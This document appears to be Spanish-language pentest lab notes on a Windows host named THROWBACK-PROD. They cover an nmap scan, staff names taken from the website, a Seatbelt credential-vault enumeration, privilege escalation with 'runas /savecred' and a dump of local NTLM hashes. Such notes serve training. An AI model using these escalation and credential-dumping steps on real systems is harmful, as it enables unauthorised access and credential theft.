# THROWBACK PROD

## Initial Scan
```
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 85:b8:1f:80:46:3d:91:0f:8c:f2:f2:3f:5c:87:67:72 (RSA)
|   256 5c:0d:46:e9:42:d4:4d:a0:36:d6:19:e5:f3:ce:49:06 (ECDSA)
|_  256 e2:2a:cb:39:85:0f:73:06:a9:23:9d:bf:be:f7:50:0c (ED25519)
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Throwback Hacks
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THROWBACK
|   NetBIOS_Domain_Name: THROWBACK
|   NetBIOS_Computer_Name: THROWBACK-PROD
|   DNS_Domain_Name: THROWBACK.local
|   DNS_Computer_Name: THROWBACK-PROD.THROWBACK.local
|   DNS_Tree_Name: THROWBACK.local
|   Product_Version: 10.0.17763
|_  System_Time: 2020-09-15T11:09:37+00:00
| ssl-cert: Subject: commonName=THROWBACK-PROD.THROWBACK.local
| Not valid before: 2020-07-27T22:26:10
|_Not valid after:  2021-01-26T22:26:10
|_ssl-date: 2020-09-15T11:10:17+00:00; -1s from scanner time.
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
```
## Enum
### Web Server
Este servicio web nos permite conocer a parte del personal de la empresa, nos da sus nombres y sus cargos
```
CEO:Summers Winters
CFO:Jeff Davies
CTO:Hugh Gongo
Lead Developer:Rikka Foxx
```
Tambien un email con un dominio que no conociamos
```
hello@TBHSecurity.com
```
To do: Avergiguar la localizacion de la compañia

## Privesc
De manera transversal a la enumeracion encontramos el hash de un usuario de este equipo si nos conectamos y pasamos el binario de Seatbelt podremos ver que hay un usuario con las credenciales en el Vault
```
====== CredEnum ======                                                                                                                                                                                                                                                                                                                                                                                                                                                                      Target              : localadmin.pass                                                                                                                                                                                                        UserName            : admin-petersj                                                                                                                                                                                                          Password            :                                                                                                                                                                                                                        CredentialType      : DomainPassword                                                                                                                                                                                                         PersistenceType     : Enterprise                                                                                                                                                                                                             LastWriteTime       : 8/25/2020 2:52:57 AM    
```
Podremos elevar privilegios haciendo lo siguiente
```
runas /savecred /user:admin-petersj /profile "cmd.exe"
```
## Post-explotaion
### PowerDump
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1009:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin-petersj:1010:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
### 
